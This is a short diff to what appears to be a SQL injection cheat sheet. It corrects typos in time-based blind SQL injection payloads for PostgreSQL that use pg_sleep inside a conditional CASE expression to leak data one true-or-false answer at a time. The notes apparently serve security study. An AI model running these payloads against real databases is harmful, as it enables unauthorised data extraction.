@@ -178,7 +178,7 @@ xyz' || (SELECT CASE WHEN rest-of-query...
 - Time delays based on true or false condition could be used extract data
 ```sql
 '||pg_sleep(10)--
-'||(select case when (query/condition) then pg_sleep(10) selse pg_sleeip(-1) end)--
+'||(select case when (query/condition) then pg_sleep(10) else pg_sleep(-1) end)--
 ```
 ## Blind SQLi - Out-of-band (OAST) techniques
 - Useful for asynchronous sql queries
